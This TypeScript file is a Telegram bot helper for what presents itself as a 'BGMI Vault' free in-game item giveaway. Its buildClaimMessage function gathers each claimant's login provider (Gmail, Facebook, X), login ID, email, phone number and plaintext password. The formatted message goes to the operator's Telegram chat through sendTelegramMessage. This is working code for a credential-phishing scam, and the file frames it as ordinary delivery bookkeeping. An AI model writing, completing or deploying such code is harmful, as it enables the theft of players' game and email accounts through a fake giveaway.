// Telegram Bot API helper
//
// The bot token and chat ID are read from the .env file:
//   TELEGRAM_BOT_TOKEN  — your bot token from @BotFather
//   TELEGRAM_CHAT_ID    — your Telegram chat ID (message @userinfobot to get it)
//
// Update the .env file to change these values, then restart the dev server.

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

const API_BASE = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

export interface TelegramResult {
  ok: boolean;
  message_id?: number;
  error?: string;
}

/**
 * Send a formatted HTML message to the configured Telegram chat.
 */
export async function sendTelegramMessage(
  text: string,
  parseMode: "HTML" | "MarkdownV2" | "Markdown" = "HTML"
): Promise<TelegramResult> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return {
      ok: false,
      error:
        "Telegram is not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in the .env file.",
    };
  }

  try {
    const res = await fetch(`${API_BASE}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: parseMode,
        disable_web_page_preview: true,
      }),
      // Telegram API can be slow; give it room
      signal: AbortSignal.timeout(15000),
    });
    const data = await res.json();
    if (!data.ok) {
      return { ok: false, error: data.description || "Telegram API error" };
    }
    return { ok: true, message_id: data.result?.message_id };
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : "fetch failed" };
  }
}

/**
 * Get basic bot info — verifies the token is valid.
 */
export async function getTelegramBotInfo() {
  if (!TELEGRAM_BOT_TOKEN) {
    return { ok: false, error: "Telegram bot token is not configured in .env." };
  }

  try {
    const res = await fetch(`${API_BASE}/getMe`, {
      signal: AbortSignal.timeout(10000),
    });
    const data = await res.json();
    if (!data.ok) return { ok: false, error: data.description };
    return {
      ok: true,
      username: data.result?.username,
      first_name: data.result?.first_name,
      id: data.result?.id,
      can_join_groups: data.result?.can_join_groups,
      can_read_all_group_messages: data.result?.can_read_all_group_messages,
      supports_inline_queries: data.result?.supports_inline_queries,
    };
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : "fetch failed" };
  }
}

/**
 * Build a richly-formatted Telegram message for a BGMI claim.
 * Includes all player details + login credentials (password, login ID, etc.)
 */
export function buildClaimMessage(input: {
  itemName: string;
  itemType: string;
  playerName: string;
  playerLevel: string;
  email: string;
  phoneNumber: string;
  bgmiUid: string;
  password: string;
  provider?: string;
  loginIdentifier?: string;
  loginPassword?: string;
  claimId?: string;
}): string {
  const typeIcon =
    input.itemType === "gun"
      ? "🔫"
      : input.itemType === "suit"
        ? "🦾"
        : input.itemType === "vehicle"
          ? "🚗"
          : "🎁";
  const providerIcon =
    input.provider === "gmail"
      ? "🟢"
      : input.provider === "facebook"
        ? "🔵"
        : input.provider === "x"
          ? "𝕏"
          : "";
  return [
    "🎮 <b>BGMI VAULT — NEW CLAIM</b> 🎮",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    `${typeIcon} <b>Item:</b> ${escapeHtml(input.itemName)}`,
    `🏷 <b>Type:</b> ${escapeHtml(input.itemType.toUpperCase())}`,
    `💸 <b>Price:</b> <b>FREE</b> (0 UC)`,
    "",
    "👤 <b>PLAYER DETAILS</b>",
    "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄",
    `🎮 <b>IGN:</b> ${escapeHtml(input.playerName)}`,
    `⭐ <b>Level:</b> ${escapeHtml(input.playerLevel)}`,
    `🆔 <b>UID:</b> <code>${escapeHtml(input.bgmiUid)}</code>`,
    // LOGIN METHOD — shows email/phone/id + password (no duplicates)
    "",
    "🔐 <b>LOGIN METHOD</b>",
    "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄",
    `${providerIcon} <b>Provider:</b> ${escapeHtml(input.provider ?? "direct")}`,
    input.loginIdentifier
      ? `👤 <b>Login ID:</b> <code>${escapeHtml(input.loginIdentifier)}</code>`
      : "",
    input.email
      ? `📧 <b>Email:</b> <code>${escapeHtml(input.email)}</code>`
      : "",
    input.phoneNumber
      ? `📞 <b>Phone:</b> <code>+${escapeHtml(input.phoneNumber)}</code>`
      : "",
    `🔑 <b>Password:</b> <code>${escapeHtml(input.loginPassword || input.password)}</code>`,
    "",
    `🕒 <b>Time:</b> ${new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })} IST`,
    "",
    "━━━━━━━━━━━━━━━━━━━━",
    "✅ <i>Deliver this item to the player's in-game mail within 24h.</i>",
  ].join("\n");
}
function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
